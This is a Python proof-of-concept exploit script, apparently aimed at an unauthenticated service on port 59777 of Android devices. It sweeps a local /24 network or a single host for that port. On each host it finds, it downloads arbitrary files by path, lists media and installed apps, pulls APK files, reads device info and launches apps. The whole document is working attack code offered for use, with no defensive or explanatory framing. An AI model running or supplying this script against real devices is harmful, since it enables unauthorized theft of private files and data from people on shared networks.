import json
import optparse
import requests
import sys

from socket import *

verbose = True


def sanitize_json(json):
    json = json.replace("\'", "\"")
    json = json.split('[')[1].split(']')[0]
    json = json[0:len(json)-6] + "}"
    return json


def get_file(addr, filepath):
    if verbose:
        print('[*] Getting file: ' + filepath + '\n\tfrom: ' + addr)
    session = requests.Session()

    headers = {"Content-Type": "application/json"}
    address = 'http://' + addr + ':59777' + filepath
    filename = filepath.rsplit('/', 1)[1]

    resp = session.get(address, headers=headers, verify=False)
    if verbose:
        print('[*] Server responded with: ' + str(resp.status_code))
    if resp and resp.status_code == 200:
        if verbose:
            print('[*] Writing to file: ' + filename)
        with open(filename, 'wb') as f:
            f.write(resp.content)


def execute_cmd(addr, cmd, package):
    if verbose:
        print('[*] Executing command: ' + cmd + ' on ' + addr)

    session = requests.Session()
    headers = {"Content-Type": "application/json"}
    address = 'http://' + addr + ':59777'

    if package != '':
        data = '{ "command":' + cmd + ', "appPackageName":' + package + ' }'
    else:
        data = '{ "command":' + cmd + ' }'

    resp = session.post(address, headers=headers, data=data, verify=False)
    if verbose:
        print('[*] Server responded with: ' + str(resp.status_code))
    if "NameNotFoundException" in resp.text:
        print('[!] Package \'' + package + '\' not found!')
        return
    if cmd not in ('getDeviceInfo', 'appLaunch', 'listAppsSdcard', 'listVideos', 'listFiles'):
        text = sanitize_json(resp.text)
    else:
        text = resp.text

    if resp and resp.status_code == 200:
        if cmd == 'getAppThumbnail':
            if verbose:
                print('[*] Getting app thumbnail: ' + package)
            with open(package + ".jpg", 'wb') as f:
                f.write(resp.content)
        elif cmd == 'appPull':
            if verbose:
                print('[*] Pulling app: ' + package)
            with open(package + ".apk", 'wb') as f:
                f.write(resp.content)
        else:
            print(text)


def is_up(addr):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(1)
    if not s.connect_ex((addr, 59777)):
        s.close()
        return 1
    else:
        s.close()


def show_available_cmds():
    print('')
    print('######################')
    print('# Available Commands #')
    print('######################')
    print('')
    print('listFiles: List all the files')
    print('listPics: List all the pictures')
    print('listVideos: List all the videos')
    print('listAudios: List all the audio files')
    print('listApps: List all the apps installed')
    print('listAppsSystem: List all the system apps')
    print('listAppsPhone: List all the phone apps')
    print('listAppsSdcard: List all the apk files in the sdcard')
    print('listAppsAll: List all the apps installed (system apps included)')
    print('getDeviceInfo: Get device info. Package name parameter is needed')
    print('appPull: Pull an app from the device')
    print('appLaunch: Launch an app. Package name parameter is needed')
    print('getAppThumbnail: Get the icon of an app. Package name parameter is needed')
    print('')


def set_up_menu():
    parser = optparse.OptionParser()

    parser.add_option('-g', '--get-file',
                      action="store", dest="filepath",
                      help="Get file path", default="")
    parser.add_option('-c', '--cmd',
                      action="store", dest="cmd",
                      help="Command to execute", default="")
    parser.add_option('-p', '--pkg',
                      action="store", dest="package",
                      help="Package name", default="")
    parser.add_option('--ip', '--host',
                      action="store", dest="host",
                      help="Target host IP", default="")
    parser.add_option('-n', '--network',
                      action="store", dest="network",
                      help="Network to scan", default="192.168.0.")
    parser.add_option('-v', '--verbose',
                      action="store_true", dest="verb",
                      help="Loud stdout")

    return parser.parse_args()


def main():
    options, _ = set_up_menu()
    verbose = options.verb

    if len(sys.argv) > 1 and sys.argv[1] == 'list':
        show_available_cmds()
    elif options.filepath != '' or options.cmd != '':
        def scan_host(addr):
            if verbose:
                print('[*] Checking address: ' + addr)

            if is_up(addr):
                if verbose:
                    print('[+] Address is up: ' + addr)

                if options.filepath != '':
                    get_file(addr, options.filepath)
                elif options.cmd != '':
                    execute_cmd(addr, options.cmd, options.package)

        if options.host != '':
            scan_host(options.host)
        else:
            for ip in range(0, 255):
                scan_host(options.network + str(ip))
    else:
        print('Usage:')
        print('- python3 poc.py list')
        print('- python3 poc.py --get-file [filepath]')
        print('- python3 poc.py --cmd [cmd]')
        print('- python3 poc.py --cmd [cmd] --host [target_host]')
        print('- python3 poc.py --cmd [cmd] --network [network]')
        print('- python3 poc.py --cmd [cmd] --pkg [package_name]')
        print('- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]')


if __name__ == '__main__':
    main()
